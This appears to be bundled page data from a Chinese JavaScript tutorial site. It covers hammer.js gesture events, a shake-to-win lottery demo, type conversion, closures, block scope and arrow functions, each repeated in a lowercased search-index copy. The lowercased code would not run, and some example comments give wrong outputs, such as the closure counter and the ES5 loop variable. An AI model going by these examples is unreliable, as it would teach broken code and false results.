禁用双击/缩放功能，更多的控制网页，支持触摸操作的浏览器不需要这样做\n\n<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1, maximum-scale=1">\n\n\n# 手势总结\n\n\n\n 1. tap\n    在指定的 dom 区域内，一个手指轻拍或点击时触发该事件（类似 pc 端的 click），该事件最大点击时间为 250ms，如果超过 250ms 则按 press 事件处理\n 2. press 在指定的 dom 区域内，这个事件相当于 pc 端的 click 事件，不能包含任何的移动，最小按压时间为 500ms，常用于我们在手机上用的复制粘贴等功能\n    该事件事分别对以下事件进行监听并处理\n    * pressup: 点击事件离开时触发\n 3. pan 在指定的 dom 区域内，一个手指放下并移动事件，即触屏中的拖动事件\n    该事件事分别对以下事件进行监听并处理\n    * panstart: 拖动开始\n    * panmove: 拖动过程\n    * panend: 拖动结束\n    * pancancel: 拖动取消\n    * panleft: 向左拖动\n    * panup: 向上拖动\n    * pandown: 向下拖动\n 4. swipe 在指定的 dom 区域内，一个手指快速的在触屏上滑动，即平时用到最多的滑动事件\n    该事件事分别对以下事件进行监听并处理\n    * swipeleft: 向左滑动\n    * swiperight: 向右滑动\n    * swipeup: 向上滑动\n    * swipedown: 向下滑动\n 5. pinch 在指定的 dom 区域内，两个手指（默认为两个手指，多指触控需要单独设置）或多个手指相对（越来越近）移动或相向（越来越远）移动时事件\n    该事件事分别对以下事件进行监听并处理\n    * pinchstart: 多点触控开始\n    * pinchmove: 多点触控过程\n    * pinchend: 多点触控结束\n    * pinchcancel: 多点触控取消\n    * pinchin: 多点触控时两手指越来越近\n    * pinchout: 多点触控时两手指越来越远\n 6. rotate 在指定的 dom 区域内，当两个手指或更多手指呈圆型旋转时触发\n    该事件事分别对以下事件进行监听并处理\n    * rotatestart: 旋转开始\n    * rotatemove: 旋转过程\n    * rotateend: 旋转结束\n    * rotatecancel: 旋转取消\n\n# 事件对象\n\nname              value\ntype              事件的名称，例如 panstart\ndeltax            x 轴移动\ndeltay            y 轴移动\ndeltatime         自从第一次 input 的总时间，单位 ms\ndistance          移动距离\nangle             角度\nvelocityx         x 轴上的速度，单位为 px/ms\nvelocityy         y 轴上的速度，单位为 px/ms\nvelocity          velocityx/velocityy 的最高值\ndirection         移动方向，匹配 direction 常量\noffsetdirection   相对于起点的方向，匹配 direction 常量\nscale             在多点触摸缩放时，只是触摸时值为 1\nrotation          在多点触摸旋转时，只是触摸时值为 0\ncenter            多点触摸的中心位置，或者只是单独的点\nsrcevent          源事件对象，类型为 touchevent，mouseevent 或 pointerevent\ntarget            收到该事件的目标\npointertype       主要点类型，可能是 touch，mouse，pen 或 kinect\neventtype         事件类型，匹配 input 常量\nisfirst           第一个 input 时为 true\nisfinal           最后一个 input 时为 true\npointers          所有点的数组，包括结束点（touchend，mouseup）\nchangedpointers   包含所有 new/moved/lost 的点\npreventdefault    参考 srcevent.preventdefault() 方法\n\n# 使用注意事项\n\n 1. 尽量避免垂直 pan/swipe\n    垂直 pan 用于滚动页面，一些（旧）浏览器不会触发这个事件，所以 hammer.js 无法识别\n 2. 删除 windows phone 上的突出显示\n    windows phone 上的 ie10 和 ie11 在点击某个元素时会突出显示一个小点，添加这个 meta 来删除\n    <meta name="msapplication-tap-highlight" content="no" />\n 3. tap 后，click 也被触发了\n    该点击事件也被称为 “幽灵点击”（ghost click）\n\n\n# 案例\n\n\n# 摇一摇\n\n<!doctype html>\n<html>\n <head>\n     <meta charset="utf-8">\n     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">\n     <title>摇一摇抽奖</title>\n    <style type="text/css">\n        html,body{ width:100%; height:100%; background-color: #000; margin:0; overflow: hidden;}\n       .tip{ position: absolute; bottom: 30px; left: 10px; color: #fff; font-family: \'楷体\'; text-align: center; right: 10px; height: 32px; line-height: 32px; background-color: rgba(255,255,255,.4); border-radius: 3px; } .tip.active{ -webkit-animation: jump 1.5s linear; animation: jump 1s linear; }\n   </style>\n</head>\n<body>\n    <div class="tip" id="tip"> </div>\n\n    <script type="text/javascript">\n        var lastx = null,\n            lasty = null,\n            lastz = null;\n        var threshold = 3; //灵敏度（值越小灵敏度越高）\n        var timeout = 1000;\n        var lasttime = null;\n        var isshaking = !1;\n        document.addeventlistener(\'domcontentloaded\', function (e) {\n            ready();\n        }, !1);\n        /*脚本逻辑：\n        *移动端js脚本逻辑的实现，摇一摇的实现需借助html5新增的devicemotion事件，获取设备在位置和方向上的改变速度的相关信息。\n        *devicemotion事件对象中有一个accelerationincludinggravity属性，该属性包括：一个包含x、y 和z 属性的对象，在考虑z 轴自然重力加速度的情况下，告诉你在每个方向上的加速度。\n        */\n        function ready() {\n            if (window.devicemotionevent) {\n                window.addeventlistener(\'devicemotion\', handler, !1);\n                lasttime = new date();\n            } else {\n                alert(\'你的浏览器不支持摇一摇功能.\');\n            }\n        }\n        function handler(e) {\n            var current = e.accelerationincludinggravity;\n            var currenttime;\n            var timedifference;\n            var deltax = 0;\n            var deltay = 0;\n            var deltaz = 0;\n\n            //记录上一次设备在x,y,z方向上的加速度\n            if ((lastx === null) && (lasty === null) && (lastz === null)) {\n                lastx = current.x;\n                lasty = current.y;\n                lastz = current.z;\n                return;\n            }\n\n            //得到两次移动各个方向上的加速度绝对差距\n            deltax = math.abs(lastx - current.x);\n            deltay = math.abs(lasty - current.y);\n            deltaz = math.abs(lastz - current.z);\n            //当差距大于设定的阀值并且时间间隔大于指定阀值时，触发摇一摇逻辑\n            if (((deltax > threshold) && (deltay > threshold)) || ((deltax > threshold) && (deltaz > threshold)) || ((deltay > threshold) && (deltaz > threshold))) {\n                currenttime = new date;\n                timedifference = currenttime.gettime() - lasttime.gettime();\n                //时间间隔\n                if (timedifference > timeout) {\n                    //触发摇一摇事件\n                    dealshake();\n                    lasttime = new date;\n                }\n            }\n\n            lastx = current.x;\n            lasty = current.y;\n            lastz = current.z;\n        }\n\n        function dealshake() {\n            if (isshaking) return;\n             isshaking = !0;\n\n            document.getelementbyid("tip").innerhtml = "恭喜您，摇中：" + getname();\n\n            settimeout(function () {\n                isshaking = !1;\n                document.getelementbyid("tip").innerhtml = " ";\n            }, 1000);\n\n        }\n        function getname() {\n            var chars = ["一等奖", "二等奖", "三等奖", "四等奖", "五等奖"];\n            return chars[getrandom(0, chars.length - 1)];\n        }\n        function getrandom(minvalue, maxvalue) {\n            return math.round(math.random() * (maxvalue - minvalue)) + minvalue;\n        }\n    <\/script>\n</body>\n</html>\n',charsets:{cjk:!0}},{title:"类型转换",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/06-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.html",relativePath:"Javascript/Javascript基础语法/05-函数/06-数据类型转换.md",key:"v-71c5bcdd",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/06-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.html",headers:[{level:2,title:"强制类型转换",slug:"强制类型转换",normalizedTitle:"强制类型转换",charIndex:11},{level:2,title:"隐式类型转换",slug:"隐式类型转换",normalizedTitle:"隐式类型转换",charIndex:150},{level:3,title:"算数运算符类",slug:"算数运算符类",normalizedTitle:"算数运算符类",charIndex:273},{level:3,title:"关系运算符类",slug:"关系运算符类",normalizedTitle:"关系运算符类",charIndex:438},{level:3,title:"逻辑运算符类",slug:"逻辑运算符类",normalizedTitle:"逻辑运算符类",charIndex:518},{level:3,title:"语句",slug:"语句",normalizedTitle:"语句",charIndex:574}],headersStr:"强制类型转换 隐式类型转换 算数运算符类 关系运算符类 逻辑运算符类 语句",content:'# 类型转换\n\n\n# 强制类型转换\n\n> 详见上一节 "内置顶层函数"\n\n * Number() 转换成数值类型\n * String() 转换成字符串类型\n * Boolean() 转换成布尔类型\n * parseInt() 将字符串转换为整型\n * parseFloat() 转换为浮点型\n\n\n# 隐式类型转换\n\n> 由于js是弱类型语言，在使用算术运算符时，运算符两边的数据类型可以是任意的。比如，一个字符串可以和数字相加。之所以不同的数据类型之间可以做运算，是因为JavaScript引擎在运算之前会悄悄的把他们进行了隐式类型转换\n\n\n# 算数运算符类\n\n# - * / %\n\n* 在进行算术运算，如果操作数不是数值，将会隐式的调用Number()函数，按照这个函数的转换规则进行转换\n* 如果转换不成功，整个表达式返回NaN\n\n\n# +\n\n*  任何数据类型和`字符串`相加，返回他们拼接的结果。\n*  如果操作数不包含字符串，则规则同 `- * / %`\n\n\n\n# 关系运算符类\n\n * 两个操作数都是字符串，则比较两个字符串对应的字符编码\n * 除此之外，参与比较的数据都会隐式调用Number()进行转换后再比较\n\n\n# 逻辑运算符类\n\n * && || !运算，会调用 Boolean()函数判断参与逻辑运算的数据的真假性\n\n\n# 语句\n\n> if、while、do while语句和三元表达式里面的判断条件表达式会隐式的调用Boolean()函数，按照这个函数的转换规则，转换为相应的布尔值\n\n// 判断一个字符串是否为空\nvar str = "";\nif(str){\n  console.log("str is true")\n}\n',normalizedContent:'# 类型转换\n\n\n# 强制类型转换\n\n> 详见上一节 "内置顶层函数"\n\n * number() 转换成数值类型\n * string() 转换成字符串类型\n * boolean() 转换成布尔类型\n * parseint() 将字符串转换为整型\n * parsefloat() 转换为浮点型\n\n\n# 隐式类型转换\n\n> 由于js是弱类型语言，在使用算术运算符时，运算符两边的数据类型可以是任意的。比如，一个字符串可以和数字相加。之所以不同的数据类型之间可以做运算，是因为javascript引擎在运算之前会悄悄的把他们进行了隐式类型转换\n\n\n# 算数运算符类\n\n# - * / %\n\n* 在进行算术运算，如果操作数不是数值，将会隐式的调用number()函数，按照这个函数的转换规则进行转换\n* 如果转换不成功，整个表达式返回nan\n\n\n# +\n\n*  任何数据类型和`字符串`相加，返回他们拼接的结果。\n*  如果操作数不包含字符串，则规则同 `- * / %`\n\n\n\n# 关系运算符类\n\n * 两个操作数都是字符串，则比较两个字符串对应的字符编码\n * 除此之外，参与比较的数据都会隐式调用number()进行转换后再比较\n\n\n# 逻辑运算符类\n\n * && || !运算，会调用 boolean()函数判断参与逻辑运算的数据的真假性\n\n\n# 语句\n\n> if、while、do while语句和三元表达式里面的判断条件表达式会隐式的调用boolean()函数，按照这个函数的转换规则，转换为相应的布尔值\n\n// 判断一个字符串是否为空\nvar str = "";\nif(str){\n  console.log("str is true")\n}\n',charsets:{cjk:!0}},{title:"函数高级",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/04-%E5%87%BD%E6%95%B0%E9%AB%98%E7%BA%A7.html",relativePath:"Javascript/Javascript基础语法/05-函数/04-函数高级.md",key:"v-c7dd9e30",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/05-%E5%87%BD%E6%95%B0/04-%E5%87%BD%E6%95%B0%E9%AB%98%E7%BA%A7.html",headers:[{level:2,title:"回调函数",slug:"回调函数",normalizedTitle:"回调函数",charIndex:11},{level:2,title:"递归函数",slug:"递归函数",normalizedTitle:"递归函数",charIndex:811},{level:2,title:"闭包",slug:"闭包",normalizedTitle:"闭包",charIndex:1405},{level:3,title:"什么是闭包函数?",slug:"什么是闭包函数",normalizedTitle:"什么是闭包函数?",charIndex:1456},{level:3,title:"闭包三个特性",slug:"闭包三个特性",normalizedTitle:"闭包三个特性",charIndex:1994},{level:3,title:"闭包的缺点",slug:"闭包的缺点",normalizedTitle:"闭包的缺点",charIndex:2059},{level:3,title:"闭包小案例",slug:"闭包小案例",normalizedTitle:"闭包小案例",charIndex:2261},{level:2,title:"尾调用优化",slug:"尾调用优化",normalizedTitle:"尾调用优化",charIndex:3485},{level:2,title:"[ES6]块级作用域",slug:"es6-块级作用域",normalizedTitle:"[es6]块级作用域",charIndex:3495},{level:3,title:"什么是块级作用域",slug:"什么是块级作用域",normalizedTitle:"什么是块级作用域",charIndex:3510},{level:3,title:"函数声明与块级作用域",slug:"函数声明与块级作用域",normalizedTitle:"函数声明与块级作用域",charIndex:3941},{level:2,title:"函数扩展",slug:"函数扩展",normalizedTitle:"函数扩展",charIndex:4518},{level:3,title:"[ES6]函数参数的解构赋值",slug:"es6-函数参数的解构赋值",normalizedTitle:"[es6]函数参数的解构赋值",charIndex:4527},{level:3,title:"[ES6]箭头函数",slug:"es6-箭头函数",normalizedTitle:"[es6]箭头函数",charIndex:4813}],headersStr:"回调函数 递归函数 闭包 什么是闭包函数? 闭包三个特性 闭包的缺点 闭包小案例 尾调用优化 [ES6]块级作用域 什么是块级作用域 函数声明与块级作用域 函数扩展 [ES6]函数参数的解构赋值 [ES6]箭头函数",content:'# 函数高级\n\n\n# 回调函数\n\n> js代码会至上而下一条线执行下去，但是有时候我们需要等到一个操作结束之后再进行下一个用户操作，这时候就需要用到回调函数来控制下一个操作的功能。\n\n把一个函数的指针作为另一个函数的参数，当调用这个参数时，这个函数就叫 回调函数 。\n\nfunction A(callback) {\n\tcallback();\n\tconsole.log(\'主函数\');\n}\n\nfunction cb(){\n\tconsole.log("回调函数")\n}\nA(cb)\n\n\n把函数整体作为参数传进去\n\nfunction A(callback) {\n\tcallback();\n\tconsole.log(\'主函数\');\n}\n\n\nA(function (){\n\tconsole.log("回调函数")\n})\n\n\n传参给回调函数\n\nfunction A(callback) {\n\tvar str = "传递给回调的参数";\n\tcallback(str);\n\tconsole.log(\'主函数\');\n}\n\nA(function (str){\n\t//str 是接收主函数传递的参数\n\tconsole.log("主函数传递的参数为",str);\n\tconsole.log("回调函数");\n})\n\n\n在执行回调的时候确保它是个函数\n\nfunction Fn(options, callback) {\n    if (typeof callback === "function") {\n        callback(options);\n    }\n}\n\n\n示例：封装each函数简化for循环\n\nfunction each(n,callback){\n\tfor(var i=0;i<n;i++){\n\t\tcallback(i)\n\t}\n}\n\neach(10,function(i){\n\tconsole.log(i)\n})\n\n\n\n# 递归函数\n\n所谓的 递归函数 就是在函数体内调用本函数。使用递归函数一定要注意，处理不当就会进入死循环。\n\n * 在函数内部直接或间接引用自身。\n * 每个递归函数里必定会有终止条件。\n\n求阶乘：\n\nfunction factorial(c){\n  if(c == 1){\n      return c;\n  }else{\n      return c * factorial(c-1);\n  }\n}\nalert(factorial(5));\n\n\n多维数组遍历：\n\nvar new_array=[];\nfunction _getChilds(data){\n\tif(typeof data != "object" || data == null){\n\t\tnew_array.push(data);\n\t}else{\n\t\tgetChilds(data);\n\t}\n}\nfunction getChilds(data){\n\tfor(var i in data){\n\t\t_getChilds(data[i]);\n\t}\n}\nvar json = {\n\t"aa" : {"l" : 1,"m" : 3},\n\t"bb" : 1,\n\t"cc" : "abc",\n\t"dd" : true,\n\t"ee" : null\n}\ngetChilds(json)\nconsole.log(new_array)\n\n\n\n# 闭包\n\n> 闭包是JavaScript语言的一大特点，主要应用场合为:设计私有的方法和变量。\n\n\n# 什么是闭包函数?\n\n> 理解闭包前，需要先理解 全局作用域和局部作用域 的区别。函数内部可以访问全局作用域下定义的全局变量，而函数外部却无法访问到函数内部定义(局部作用域)的局部变量。\n\n * 概念： 闭包（closure）是定义在一个外部函数内部，并且能够访问外部函数中变量的函数。\n   \n * 原理： 作用域链\n   \n\n创建闭包的常见方式，就是在一个函数内部创建另一个函数并返回：\n\nfunction fun(num){\n\treturn function (){\n\t\treturn num;\n\t}\n}\nvar end = fun(100);\nend();  //  100  \n\n\n上述案例中，num 是fun函数内部的变量，本来只能fun函数内部使用，但是返回的函数也有权限访问num。所以在函数外部通过调用返回的函数即可得到函数内部的变量\n\nfunction out (){\n   var n = 1;\n   return function (){\n\t   return n++;\n} }\nvar fn = out();\nconsole.log(fn()) //1\nconsole.log(fn()) //2\nconsole.log(fn()) //3\n\n\n\n# 闭包三个特性\n\n 1. 函数嵌套函数\n 2. 函数内部可以引用外部的参数和变量\n 3. 参数和变量不会被垃圾回收机制回收\n\n\n# 闭包的缺点\n\n闭包的缺点就是常驻内存，会增大内存使用量，使用不当很容易造成内存泄漏。 一般函数执行完毕后，局部活动对象就会被销毁，内存中仅仅保存全局作用域。但闭包的情 况不同。\n\nJavaScript的垃圾回收机制\n\n\n 1. 在JavaScript中，如果一个对象不再被引用，那么这个对象就会被GC回收。\n 2. 如果两个对象互相引用，而不被第三者所引用，那么这两个互相引用的对象也会被回收。\n\n\n# 闭包小案例\n\n那么使用闭包有什么好处呢?\n\n 1. 希望一个局部变量长期驻扎在内存中\n 2. 避免全局变量的污染\n 3. 私有成员的存在\n\n# 局部变量长期驻扎内存\n\nfunction out (){\n    var n = 1;\n    return function (){\n        return n++;\n\t}\n}\nvar fn = out();\nconsole.log(fn())\nconsole.log(fn())\nconsole.log(fn())\n\n\n在循环中直接找到对应的元素的索引\n\n <ul>\n   <li>1111111</li>\n   <li>1111111</li>\n   <li>1111111</li>\n</ul>\nvar lis=document.getElementsByTagName("li");\nfor(var i=0;i<lis.length;i++){\n    (function(i){\n        lis[i].onclick=function(){\n            alert(i);//0 1 2\n        }\n\t})(i)\n}\n\n\nfor(var i=0;i<10;i++){\n    setTimeout(function(){\n        console.log(i);    //10\n    }, 1000)\n}\n\n\n# 避免全局变量污染\n\n但我们声明一个函数的时候其实就相当于创建一个全局变量 上一个例子中总共占有2个全局变量。\n\n函数表达式 函数自调用:\n\n(function(){\n})()\n\n\n var out = (function(){\n    var n1 = 1;\n    var n2 = 100;\n    return function(){\n        n1++;\n        n2--;\n        return n1+n2;\n} })()\nout() // 1\nout() // 2\n\n\n# 私有成员的存在\n\n模块化代码\n\nvar aa=(function(){\n   var a=10;\n   function aaa(){\n       a++;\n\t   alert(a);\n   }\n   function bbb(){\n       a+=10;\n\t   alert(a);\n   }\n   return {\n      a:aaa,\n\t  b:bbb\n   }\n})()\naa.a(); //11\naa.b(); //21\n\n\n这样做的好处就是 bbb aaa 这两个函数我们在外面是访问不到的\n\n * JavaScript内部原理系列－闭包（Closures）\n\n> 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露。\n\n\n# 尾调用优化\n\n\n# [ES6]块级作用域\n\n\n# 什么是块级作用域\n\nJS中作用域有：全局作用域、函数作用域。没有块作用域的概念。ECMAScript 6(简称ES6)中新增了块级作用域。\n\n块作用域由 { } 包括，if语句和for语句里面的{ }都属于块作用域。\n\nES5没有块级作用域概念：\n\n{\n  var num = 10;\n}\nconsole.log(num)    // 10\n\n// for循环结束后，变量i依然会存在\nfor(var i = 10; i<5;i++){ }\nconsole.log(i);   // 5\n\n\nES6的块级作用域：\n\n{\n  let num = 10;\n}\nconsole.log(num)    // 报错： num is not defined\n\n// 由于i是存在于块级作用域中，所以i只能在循环{}中使用\nfor(let i = 10; i<5;i++){ }\nconsole.log(i);   // 报错： i is not defined\n\n\n\n# 函数声明与块级作用域\n\n * ES5中，函数只能在顶层作用域和函数作用域中声明，不能在块级作用域中声明。\n * ES6中，在块级作用域内部声明的变量函数，其行为类似于let，即块级作用域外不可使用\n\n  function fun(){\n    console.log("I am outside function.")\n  }\n  if (true) {\n    function fun() {\n      console.log("I am inside function.");\n    }\n    fun();    // I am inside function.\n  }\n  fun();    // I am inside function.\n\n\n\'use strict\'      //es6 中的运行结果\nfunction fun(){\n  console.log("I am outside function.")\n}\nif (true) {\n  function fun() {\n    console.log("I am inside function.");\n  }\n  fun();    // I am inside function.\n}\nfun();    // I am outside function.\n\n\n\n# 函数扩展\n\n\n# [ES6]函数参数的解构赋值\n\n> ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构\n\n只需要保证实参和形参数据类型同为数组或对象，即可进行函数参数的解构赋值：\n\nfunction add([x, y]){\n  return x + y;\n}\n\nadd([1, 2]); // 3\n\n\nfunction fun({num1:x, num2:y}) {\n  return x + y;\n}\nfun({num1: 1, num2: 2})  // 3\n\n[[1, 2], [3, 4]].map(([a, b]) => a + b);\n\n\n\n\n# [ES6]箭头函数\n\n# 基本用法\n\nES6允许使用“箭头”（=>）定义函数。\n\nvar f = v => v;\n\n\n上面的箭头函数等同于：\n\nvar f = function(v) {\nreturn v;\n};\n\n\n * 如果箭头函数不需要参数，就使用一个()或_代表参数部分。\n * 如果箭头函数需要多个参数，就使用一个()代表参数部分。\n\nvar f = () => 5;\nvar f = _ => 5;\n// 等同于\nvar f = function () { return 5 };\n\nvar sum = (num1, num2) => num1 + num2;\n// 等同于\nvar sum = function(num1, num2) {\nreturn num1 + num2;\n};\n\n\n如果箭头函数的代码块部分多于一条语句，就要使用大括号将它们括起来。\n\nvar sum = (num1, num2) => {\n\tconsole.log(num2);\n\tconsole.log(num1);\nreturn num1 + num2;\n}\n\nconsole.log(sum(1,2));     // 2  1  3\n\n\n由于大括号被解释为代码块，所以如果箭头函数直接返回一个json，必须在对象外面加上括号。\n\nvar person = age => ({ name: "Tom", age: age});\nconsole.log(person(21));     //Object {name: "Tom", age: 21}\n\n\n箭头函数可以与变量解构结合使用。\n\nvar full = ({ name, age}) => name + \'-\' + age;\nconsole.log(full({name:"Tom",age:21}));     // Tom-21\n\n\n箭头函数使得表达更加简洁。\n\nconst isEven = n => n % 2 == 0;\nconst square = n => n * n;\n\n\n箭头函数的其中一个用处是简化回调函数。\n\n// 正常函数写法\nvar arr1 = [1,2,3].map(function (x) {\nreturn x * x;\n});\nconsole.log(arr1);    //[1,4,9]\n\n// 箭头函数写法\nvar arr2 = [1,2,3].map(x => x * x);\nconsole.log(arr2);    //[1,4,9]\n\n\n# 使用注意点\n\n 1. this对象的指向是可变的，但是在箭头函数中，它是固定的。\n\nfunction foo() {\n  setTimeout(() => {\n    console.log(\'id:\', this.id);\n  }, 100);\n  setTimeout(function () {\n    console.log("id:",this.id);\n  },100)\n}\n\n  var id = 21;\n  foo.call({ id: 42 });\n//id: 42\n//id: 21\n\n\n 2. 不能当做构造函数\n 3. 箭头函数没有arguments对象',normalizedContent:'# 函数高级\n\n\n# 回调函数\n\n> js代码会至上而下一条线执行下去，但是有时候我们需要等到一个操作结束之后再进行下一个用户操作，这时候就需要用到回调函数来控制下一个操作的功能。\n\n把一个函数的指针作为另一个函数的参数，当调用这个参数时，这个函数就叫 回调函数 。\n\nfunction a(callback) {\n\tcallback();\n\tconsole.log(\'主函数\');\n}\n\nfunction cb(){\n\tconsole.log("回调函数")\n}\na(cb)\n\n\n把函数整体作为参数传进去\n\nfunction a(callback) {\n\tcallback();\n\tconsole.log(\'主函数\');\n}\n\n\na(function (){\n\tconsole.log("回调函数")\n})\n\n\n传参给回调函数\n\nfunction a(callback) {\n\tvar str = "传递给回调的参数";\n\tcallback(str);\n\tconsole.log(\'主函数\');\n}\n\na(function (str){\n\t//str 是接收主函数传递的参数\n\tconsole.log("主函数传递的参数为",str);\n\tconsole.log("回调函数");\n})\n\n\n在执行回调的时候确保它是个函数\n\nfunction fn(options, callback) {\n    if (typeof callback === "function") {\n        callback(options);\n    }\n}\n\n\n示例：封装each函数简化for循环\n\nfunction each(n,callback){\n\tfor(var i=0;i<n;i++){\n\t\tcallback(i)\n\t}\n}\n\neach(10,function(i){\n\tconsole.log(i)\n})\n\n\n\n# 递归函数\n\n所谓的 递归函数 就是在函数体内调用本函数。使用递归函数一定要注意，处理不当就会进入死循环。\n\n * 在函数内部直接或间接引用自身。\n * 每个递归函数里必定会有终止条件。\n\n求阶乘：\n\nfunction factorial(c){\n  if(c == 1){\n      return c;\n  }else{\n      return c * factorial(c-1);\n  }\n}\nalert(factorial(5));\n\n\n多维数组遍历：\n\nvar new_array=[];\nfunction _getchilds(data){\n\tif(typeof data != "object" || data == null){\n\t\tnew_array.push(data);\n\t}else{\n\t\tgetchilds(data);\n\t}\n}\nfunction getchilds(data){\n\tfor(var i in data){\n\t\t_getchilds(data[i]);\n\t}\n}\nvar json = {\n\t"aa" : {"l" : 1,"m" : 3},\n\t"bb" : 1,\n\t"cc" : "abc",\n\t"dd" : true,\n\t"ee" : null\n}\ngetchilds(json)\nconsole.log(new_array)\n\n\n\n# 闭包\n\n> 闭包是javascript语言的一大特点，主要应用场合为:设计私有的方法和变量。\n\n\n# 什么是闭包函数?\n\n> 理解闭包前，需要先理解 全局作用域和局部作用域 的区别。函数内部可以访问全局作用域下定义的全局变量，而函数外部却无法访问到函数内部定义(局部作用域)的局部变量。\n\n * 概念： 闭包（closure）是定义在一个外部函数内部，并且能够访问外部函数中变量的函数。\n   \n * 原理： 作用域链\n   \n\n创建闭包的常见方式，就是在一个函数内部创建另一个函数并返回：\n\nfunction fun(num){\n\treturn function (){\n\t\treturn num;\n\t}\n}\nvar end = fun(100);\nend();  //  100  \n\n\n上述案例中，num 是fun函数内部的变量，本来只能fun函数内部使用，但是返回的函数也有权限访问num。所以在函数外部通过调用返回的函数即可得到函数内部的变量\n\nfunction out (){\n   var n = 1;\n   return function (){\n\t   return n++;\n} }\nvar fn = out();\nconsole.log(fn()) //1\nconsole.log(fn()) //2\nconsole.log(fn()) //3\n\n\n\n# 闭包三个特性\n\n 1. 函数嵌套函数\n 2. 函数内部可以引用外部的参数和变量\n 3. 参数和变量不会被垃圾回收机制回收\n\n\n# 闭包的缺点\n\n闭包的缺点就是常驻内存，会增大内存使用量，使用不当很容易造成内存泄漏。 一般函数执行完毕后，局部活动对象就会被销毁，内存中仅仅保存全局作用域。但闭包的情 况不同。\n\njavascript的垃圾回收机制\n\n\n 1. 在javascript中，如果一个对象不再被引用，那么这个对象就会被gc回收。\n 2. 如果两个对象互相引用，而不被第三者所引用，那么这两个互相引用的对象也会被回收。\n\n\n# 闭包小案例\n\n那么使用闭包有什么好处呢?\n\n 1. 希望一个局部变量长期驻扎在内存中\n 2. 避免全局变量的污染\n 3. 私有成员的存在\n\n# 局部变量长期驻扎内存\n\nfunction out (){\n    var n = 1;\n    return function (){\n        return n++;\n\t}\n}\nvar fn = out();\nconsole.log(fn())\nconsole.log(fn())\nconsole.log(fn())\n\n\n在循环中直接找到对应的元素的索引\n\n <ul>\n   <li>1111111</li>\n   <li>1111111</li>\n   <li>1111111</li>\n</ul>\nvar lis=document.getelementsbytagname("li");\nfor(var i=0;i<lis.length;i++){\n    (function(i){\n        lis[i].onclick=function(){\n            alert(i);//0 1 2\n        }\n\t})(i)\n}\n\n\nfor(var i=0;i<10;i++){\n    settimeout(function(){\n        console.log(i);    //10\n    }, 1000)\n}\n\n\n# 避免全局变量污染\n\n但我们声明一个函数的时候其实就相当于创建一个全局变量 上一个例子中总共占有2个全局变量。\n\n函数表达式 函数自调用:\n\n(function(){\n})()\n\n\n var out = (function(){\n    var n1 = 1;\n    var n2 = 100;\n    return function(){\n        n1++;\n        n2--;\n        return n1+n2;\n} })()\nout() // 1\nout() // 2\n\n\n# 私有成员的存在\n\n模块化代码\n\nvar aa=(function(){\n   var a=10;\n   function aaa(){\n       a++;\n\t   alert(a);\n   }\n   function bbb(){\n       a+=10;\n\t   alert(a);\n   }\n   return {\n      a:aaa,\n\t  b:bbb\n   }\n})()\naa.a(); //11\naa.b(); //21\n\n\n这样做的好处就是 bbb aaa 这两个函数我们在外面是访问不到的\n\n * javascript内部原理系列－闭包（closures）\n\n> 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在ie中可能导致内存泄露。\n\n\n# 尾调用优化\n\n\n# [es6]块级作用域\n\n\n# 什么是块级作用域\n\njs中作用域有：全局作用域、函数作用域。没有块作用域的概念。ecmascript 6(简称es6)中新增了块级作用域。\n\n块作用域由 { } 包括，if语句和for语句里面的{ }都属于块作用域。\n\nes5没有块级作用域概念：\n\n{\n  var num = 10;\n}\nconsole.log(num)    // 10\n\n// for循环结束后，变量i依然会存在\nfor(var i = 10; i<5;i++){ }\nconsole.log(i);   // 5\n\n\nes6的块级作用域：\n\n{\n  let num = 10;\n}\nconsole.log(num)    // 报错： num is not defined\n\n// 由于i是存在于块级作用域中，所以i只能在循环{}中使用\nfor(let i = 10; i<5;i++){ }\nconsole.log(i);   // 报错： i is not defined\n\n\n\n# 函数声明与块级作用域\n\n * es5中，函数只能在顶层作用域和函数作用域中声明，不能在块级作用域中声明。\n * es6中，在块级作用域内部声明的变量函数，其行为类似于let，即块级作用域外不可使用\n\n  function fun(){\n    console.log("i am outside function.")\n  }\n  if (true) {\n    function fun() {\n      console.log("i am inside function.");\n    }\n    fun();    // i am inside function.\n  }\n  fun();    // i am inside function.\n\n\n\'use strict\'      //es6 中的运行结果\nfunction fun(){\n  console.log("i am outside function.")\n}\nif (true) {\n  function fun() {\n    console.log("i am inside function.");\n  }\n  fun();    // i am inside function.\n}\nfun();    // i am outside function.\n\n\n\n# 函数扩展\n\n\n# [es6]函数参数的解构赋值\n\n> es6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构\n\n只需要保证实参和形参数据类型同为数组或对象，即可进行函数参数的解构赋值：\n\nfunction add([x, y]){\n  return x + y;\n}\n\nadd([1, 2]); // 3\n\n\nfunction fun({num1:x, num2:y}) {\n  return x + y;\n}\nfun({num1: 1, num2: 2})  // 3\n\n[[1, 2], [3, 4]].map(([a, b]) => a + b);\n\n\n\n\n# [es6]箭头函数\n\n# 基本用法\n\nes6允许使用“箭头”（=>）定义函数。\n\nvar f = v => v;\n\n\n上面的箭头函数等同于：\n\nvar f = function(v) {\nreturn v;\n};\n\n\n * 如果箭头函数不需要参数，就使用一个()或_代表参数部分。\n * 如果箭头函数需要多个参数，就使用一个()代表参数部分。\n\nvar f = () => 5;\nvar f = _ => 5;\n// 等同于\nvar f = function () { return 5 };\n\nvar sum = (num1, num2) => num1 + num2;\n// 等同于\nvar sum = function(num1, 